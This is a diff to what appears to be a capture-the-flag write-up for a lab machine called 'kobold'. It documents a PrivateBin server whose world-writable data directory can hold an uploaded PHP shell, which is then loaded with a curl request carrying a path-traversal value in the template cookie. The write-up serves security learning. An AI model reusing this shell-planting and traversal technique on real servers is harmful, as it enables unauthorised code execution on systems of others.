@@ -235,7 +235,17 @@ find: '/privatebin-data/cfg': Permission denied
 
 ```
 
-write a php shell inside /privatebin-data/data/bd/b5/ (world writable)
+World writable directory b5 can be used to upload a .php shell accessible from bin.kobold.htb
+
+```
+ben@kobold:/privatebin-data/data/bd$ ls -la
+ls -la
+total 12
+drwxrwxrwx 3 root operator 4096 Mar 15 21:23 .
+drwxrwxrwx 5 root operator 4096 Mar 15 21:23 ..
+drwxrwxrwx 2 root operator 4096 Mar 15 21:23 b5
+
+```
 
  `curl -k https://bin.kobold.htb/ \`                    
   `-b "template=../data/bd/b5/shell" \`
